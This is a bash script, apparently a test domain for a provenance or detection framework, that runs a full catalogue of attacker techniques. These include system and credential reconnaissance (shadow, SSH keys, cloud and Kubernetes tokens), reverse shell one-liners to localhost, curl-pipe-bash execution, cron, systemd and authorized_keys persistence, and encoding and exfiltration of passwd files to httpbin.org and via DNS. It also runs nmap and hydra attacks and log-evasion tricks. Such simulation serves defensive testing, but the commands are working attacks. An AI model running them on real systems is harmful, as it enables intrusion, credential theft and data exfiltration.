#!/bin/bash
# ============================================================================
# DOMAIN 20: ATTACK SIMULATION
# ============================================================================
# All attacks target localhost only. Safe for sandboxed environments.
# ============================================================================
source "$(dirname "$0")/prov_framework.sh"
domain_start "20 — ATTACK SIMULATION"

S=$(generate_sample_files)

# ============================================================================
section "Reconnaissance — system enumeration"
# ============================================================================
run "whoami" whoami
run "id" id
run "id -a" id -a 2>/dev/null || id
run "uname -a" uname -a
run "hostname" hostname
run "hostname -I" hostname -I 2>/dev/null
run "hostname -f" hostname -f 2>/dev/null
run "cat /etc/os-release" cat /etc/os-release
run "cat /proc/version" cat /proc/version
run "cat /etc/issue" cat /etc/issue 2>/dev/null
run "arch" arch
run "lsb_release -a" lsb_release -a 2>/dev/null
run "env" env
run "printenv" printenv
run "set" set 2>/dev/null | head -30
run "cat /etc/passwd" cat /etc/passwd
run "cat /etc/group" cat /etc/group
run "cat /etc/shadow" cat /etc/shadow 2>/dev/null
run "cat /etc/sudoers" cat /etc/sudoers 2>/dev/null
run "cat /etc/hosts" cat /etc/hosts
run "cat /etc/resolv.conf" cat /etc/resolv.conf 2>/dev/null
run "cat /etc/crontab" cat /etc/crontab 2>/dev/null
run "cat /etc/fstab" cat /etc/fstab 2>/dev/null
run "cat /etc/mtab" cat /etc/mtab 2>/dev/null | head -10
run "mount" mount
run "df -h" df -h
run "ps auxf" ps auxf
run "ps -eo user,pid,cmd" ps -eo user,pid,%cpu,%mem,cmd --sort=-%mem | head -15
run "ss -tlnp" ss -tlnp
run "ss -ulnp" ss -ulnp
run "ss -anp" ss -anp | head -20
run "netstat -tlnp" netstat -tlnp 2>/dev/null
run "ip addr" ip addr show 2>/dev/null
run "ip route" ip route show 2>/dev/null
run "ip neigh" ip neigh show 2>/dev/null
run "arp -a" arp -a 2>/dev/null
run "route -n" route -n 2>/dev/null

# ============================================================================
section "Reconnaissance — privilege escalation vectors"
# ============================================================================
run "find SUID" find / -perm -4000 -type f 2>/dev/null | head -30
run "find SGID" find / -perm -2000 -type f 2>/dev/null | head -20
run "find world-writable" find / -perm -0002 -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | head -20
run "find writable /etc" find /etc -writable -type f 2>/dev/null | head -10
run "find writable /var" find /var -writable -type d 2>/dev/null | head -10
run "getcap" getcap -r / 2>/dev/null | head -20
run "sudo -l" sudo -l 2>/dev/null
run "cat /etc/sudoers.d" ls -la /etc/sudoers.d/ 2>/dev/null
run "cat /etc/pam.d" ls /etc/pam.d/ 2>/dev/null
run "dpkg -l" dpkg -l 2>/dev/null | head -30
run "pip list" pip list 2>/dev/null | head -10
run "find cron" find /etc/cron* /var/spool/cron -type f 2>/dev/null | head -10
run "systemctl list enabled" systemctl list-unit-files --state=enabled --no-pager 2>/dev/null | head -15
run "find docker.sock" find / -name "docker.sock" 2>/dev/null
run "ls /var/run" ls -la /var/run/ 2>/dev/null | head -10
run "cat /etc/shells" cat /etc/shells 2>/dev/null
run "find .ssh" find / -name "authorized_keys" -o -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null | head -10
run "find .bash_history" find / -name ".bash_history" -o -name ".zsh_history" 2>/dev/null | head -5
run "cat .bash_history" cat ~/.bash_history 2>/dev/null | tail -10
run "cat .profile" cat ~/.profile 2>/dev/null
run "cat .bashrc" cat ~/.bashrc 2>/dev/null
run "find .env files" find / -name ".env" -o -name "*.env" 2>/dev/null | head -10
run "find configs" find / -name "wp-config.php" -o -name "settings.py" -o -name ".git-credentials" -o -name "application.yml" 2>/dev/null | head -5
run "env | grep secret" env | grep -iE "(pass|key|token|secret|api|cred)" 2>/dev/null | head -5
run "cat /proc/1/environ" cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -10
run "cat /proc/self/environ" cat /proc/self/environ | tr '\0' '\n' | grep -iE "(pass|key|token)" | head -5

# ============================================================================
section "Credential access"
# ============================================================================
run "read shadow" cat /etc/shadow 2>/dev/null
run "read gshadow" cat /etc/gshadow 2>/dev/null
run "read SSH keys" find /home /root -name "id_*" -type f 2>/dev/null
run "cat SSH private keys" find /home /root -name "id_rsa" -o -name "id_ed25519" -exec cat {} \; 2>/dev/null | head -5
run "read authorized_keys" find /home /root -name "authorized_keys" -exec cat {} \; 2>/dev/null | head -5
run "read known_hosts" find /home /root -name "known_hosts" -exec cat {} \; 2>/dev/null | head -5
run "read .git-credentials" find / -name ".git-credentials" -exec cat {} \; 2>/dev/null | head -5
run "read .aws/credentials" cat ~/.aws/credentials 2>/dev/null
run "read .kube/config" cat ~/.kube/config 2>/dev/null
run "read k8s token" cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
run "read /etc/ssl" ls -la /etc/ssl/private/ 2>/dev/null
run "read docker config" cat ~/.docker/config.json 2>/dev/null

# ============================================================================
section "Reverse shells (to localhost — harmless)"
# ============================================================================
run_t 3 "bash reverse shell" bash -c 'bash -i >& /dev/tcp/127.0.0.1/19999 0>&1' 2>/dev/null
run_t 3 "bash reverse shell 2" bash -c 'exec 5<>/dev/tcp/127.0.0.1/19999;cat <&5|while read line;do $line 2>&5>&5;done' 2>/dev/null
run_t 3 "python reverse shell" python3 -c 'import socket,subprocess,os;s=socket.socket();s.settimeout(1);s.connect(("127.0.0.1",19999))' 2>/dev/null
run_t 3 "python pty shell" python3 -c 'import socket,pty,os;s=socket.socket();s.settimeout(1);s.connect(("127.0.0.1",19999))' 2>/dev/null
run_t 3 "perl reverse shell" perl -e 'use Socket;$i="127.0.0.1";$p=19999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));' 2>/dev/null
run_t 3 "ruby reverse shell" ruby -rsocket -e 'begin;f=TCPSocket.open("127.0.0.1",19999);rescue;end' 2>/dev/null
run_t 3 "php reverse shell" php -r '$sock=@fsockopen("127.0.0.1",19999);if($sock)fclose($sock);' 2>/dev/null
run_t 3 "nc reverse shell" nc -w 1 127.0.0.1 19999 2>/dev/null
run_t 3 "nc -e reverse" nc -e /bin/sh 127.0.0.1 19999 2>/dev/null
run_t 3 "socat reverse" socat TCP:127.0.0.1:19999 EXEC:cat 2>/dev/null
run_t 3 "openssl reverse" openssl s_client -quiet -connect 127.0.0.1:19999 2>/dev/null
run_t 3 "lua reverse shell" lua5.4 -e 'local s=require("socket");local t=s.tcp();t:settimeout(1);t:connect("127.0.0.1",19999);t:close()' 2>/dev/null

# ============================================================================
section "LOLBins — Living off the land"
# ============================================================================
run "curl download" curl -s -o /tmp/prov_lol.html https://example.com
run "wget download" wget -q -O /tmp/prov_lol2.html https://example.com 2>/dev/null
run "base64 decode exec" echo "ZWNobyBoZWxsbyBmcm9tIGJhc2U2NA==" | base64 -d | bash
run "python exec" python3 -c "import os;os.system('echo python_lolbin')"
run "python subprocess" python3 -c "__import__('subprocess').call(['echo','python_subprocess'])"
run "perl exec" perl -e 'system("echo perl_lolbin")'
run "ruby exec" ruby -e 'system("echo ruby_lolbin")'
run "php exec" php -r 'system("echo php_lolbin");'
run "node exec" node -e 'require("child_process").execSync("echo node_lolbin",{stdio:"inherit"})'
run "lua exec" lua5.4 -e 'os.execute("echo lua_lolbin")' 2>/dev/null
run "awk exec" awk 'BEGIN{system("echo awk_lolbin")}'
run "find exec" find /tmp -name "prov_lol*" -exec cat {} \; 2>/dev/null
run "xargs exec" echo "echo xargs_lolbin" | xargs bash -c
run "env exec" env bash -c 'echo env_lolbin'
run "nice exec" nice echo "nice_lolbin"
run "timeout exec" timeout 5 echo "timeout_lolbin"
run "strace exec" strace -o /dev/null echo "strace_lolbin" 2>/dev/null
run "tee exec" echo "echo tee_lolbin" | tee /tmp/prov_tee_exec.sh | bash; rm -f /tmp/prov_tee_exec.sh
run "tar extract exec" echo "echo tar_lolbin" > /tmp/prov_tar.sh && tar czf /tmp/prov_tar.tar.gz -C /tmp prov_tar.sh && tar xzf /tmp/prov_tar.tar.gz -C /tmp && bash /tmp/prov_tar.sh; rm -f /tmp/prov_tar*
run "busybox" busybox echo "busybox_lolbin" 2>/dev/null || true
run "expect exec" expect -c 'spawn echo expect_lolbin; expect eof' 2>/dev/null || true
run "screen exec" screen -dm bash -c 'echo screen_lolbin > /tmp/prov_screen.txt; exit' 2>/dev/null; sleep 0.5; cat /tmp/prov_screen.txt 2>/dev/null; rm -f /tmp/prov_screen.txt

# Download and execute pattern
run "curl pipe bash" curl -s https://example.com | bash 2>/dev/null || true
run "wget pipe bash" wget -q -O - https://example.com | bash 2>/dev/null || true
run "python download exec" python3 -c "import urllib.request;urllib.request.urlretrieve('https://example.com','/tmp/prov_py_dl.html')" 2>/dev/null

# ============================================================================
section "Persistence mechanisms"
# ============================================================================
# Crontab
run "cron persistence" bash -c 'echo "*/5 * * * * /tmp/fake_beacon" | crontab - 2>/dev/null; crontab -l; crontab -r' 2>/dev/null
# Bashrc
run "bashrc inject" bash -c 'echo "# prov test" >> /tmp/fake_bashrc; rm /tmp/fake_bashrc'
# Systemd service
run "systemd persistence" bash -c 'cat > /tmp/prov_persist.service << EOF
[Unit]
Description=Fake Beacon
[Service]
ExecStart=/bin/bash -c "while true; do sleep 60; done"
Restart=always
[Install]
WantedBy=multi-user.target
EOF
cat /tmp/prov_persist.service; rm /tmp/prov_persist.service'
# Authorized keys
run "authorized_keys inject" bash -c 'echo "ssh-ed25519 AAAA_FAKE_KEY attacker@evil" > /tmp/fake_authkeys; cat /tmp/fake_authkeys; rm /tmp/fake_authkeys'
# MOTD
run "motd inject" bash -c 'echo "#!/bin/bash\necho pwned" > /tmp/fake_motd.sh; chmod +x /tmp/fake_motd.sh; cat /tmp/fake_motd.sh; rm /tmp/fake_motd.sh'
# At job
run "at persistence" bash -c 'echo "echo at_persist" | at now + 1 minute 2>/dev/null; atq 2>/dev/null; atrm 1 2>/dev/null' || true

# ============================================================================
section "Data staging and exfiltration"
# ============================================================================
run "tar sensitive" tar czf /tmp/prov_exfil.tar.gz /etc/passwd /etc/group /etc/hostname 2>/dev/null
run "tar ssh keys" tar czf /tmp/prov_ssh.tar.gz /home/*/.ssh/ /root/.ssh/ 2>/dev/null || true
run "base64 /etc/passwd" base64 /etc/passwd > /tmp/prov_b64.txt
run "base64 binary" base64 /usr/bin/id > /tmp/prov_b64_bin.txt
run "gzip shadow" gzip -c /etc/shadow > /tmp/prov_shadow.gz 2>/dev/null || true
run "xxd encode" xxd /etc/passwd > /tmp/prov_xxd.txt
run "openssl encode" openssl enc -base64 -in /etc/passwd -out /tmp/prov_ssl_b64.txt 2>/dev/null
run "exfil curl POST" curl -s -X POST -d @/tmp/prov_b64.txt https://httpbin.org/post -o /dev/null 2>/dev/null
run "exfil curl upload" curl -s -F "file=@/tmp/prov_exfil.tar.gz" https://httpbin.org/post -o /dev/null 2>/dev/null
run "dns exfil sim" bash -c 'for i in 1 2 3; do dig "$i.prov.test.example.com" @8.8.8.8 +short 2>/dev/null; done'
rm -f /tmp/prov_exfil* /tmp/prov_ssh* /tmp/prov_b64* /tmp/prov_shadow* /tmp/prov_xxd* /tmp/prov_ssl* /tmp/prov_lol* /tmp/prov_py_dl*

# ============================================================================
section "Network scanning"
# ============================================================================
run_t 30 "nmap SYN scan" nmap -sS -T4 -p 22,80,443,3306,5432,8080 127.0.0.1 2>/dev/null
run_t 30 "nmap full TCP" nmap -sT -T4 -p- 127.0.0.1 2>/dev/null | tail -20
run_t 30 "nmap version" nmap -sV -T4 -p 22 127.0.0.1 2>/dev/null
run_t 15 "nmap OS detect" nmap -O 127.0.0.1 2>/dev/null
run_t 30 "nmap aggressive" nmap -A -T4 -p 22 127.0.0.1 2>/dev/null
run_t 30 "nmap vuln scripts" nmap --script=vuln -p 22 127.0.0.1 2>/dev/null
run_t 15 "nmap UDP top" nmap -sU --top-ports 20 127.0.0.1 2>/dev/null
run "nc port scan" bash -c 'for p in 22 80 443 3306 5432 6379 8080 9090; do nc -z -w 1 127.0.0.1 $p 2>/dev/null && echo "$p open" || echo "$p closed"; done'

# ============================================================================
section "Password attacks (local only)"
# ============================================================================
run "john create hashes" bash -c 'echo "testuser:\$6\$salt\$hash" > /tmp/prov_hashes.txt'
run "john crack" john --wordlist=/usr/share/dict/words /tmp/prov_hashes.txt 2>/dev/null || true
run "john --show" john --show /tmp/prov_hashes.txt 2>/dev/null || true
run_t 15 "hydra ssh" hydra -l root -P /usr/share/dict/words -t 2 -w 3 -f ssh://127.0.0.1 2>/dev/null || true
run_t 15 "hydra ftp" hydra -l root -P /usr/share/dict/words -t 2 -w 3 -f ftp://127.0.0.1 2>/dev/null || true
rm -f /tmp/prov_hashes.txt

# ============================================================================
section "Evasion techniques"
# ============================================================================
run "process name spoof" bash -c 'exec -a "[kworker/0:1]" sleep 0.5' 2>/dev/null || true
run "timestomp" touch -t 202001011200 /tmp/prov_timestamp.txt; ls -la /tmp/prov_timestamp.txt; rm /tmp/prov_timestamp.txt
run "hidden file" touch /tmp/.prov_hidden; ls -la /tmp/.prov_hidden; rm /tmp/.prov_hidden
run "hidden dir" mkdir /tmp/.prov_hidden_dir; ls -la /tmp/.prov_hidden_dir; rmdir /tmp/.prov_hidden_dir
run "file in /dev/shm" echo "hiding in shm" > /dev/shm/.prov_hidden; cat /dev/shm/.prov_hidden; rm /dev/shm/.prov_hidden
run "obfuscated command" bash -c 'eval $(echo "ZWNobyBvYmZ1c2NhdGVk" | base64 -d)' 2>/dev/null
run "hex command" bash -c 'printf "\x65\x63\x68\x6f\x20\x68\x65\x78\x5f\x63\x6d\x64" | bash' 2>/dev/null
run "variable command" cmd="echo"; args="variable_cmd"; $cmd $args
run "IFS manipulation" bash -c 'IFS=,;cmd="echo,IFS_trick";$cmd' 2>/dev/null || true
run "history disable" HISTSIZE=0 bash -c 'echo "no history"' 2>/dev/null
run "unset HISTFILE" bash -c 'unset HISTFILE; echo "histfile unset"' 2>/dev/null

domain_end
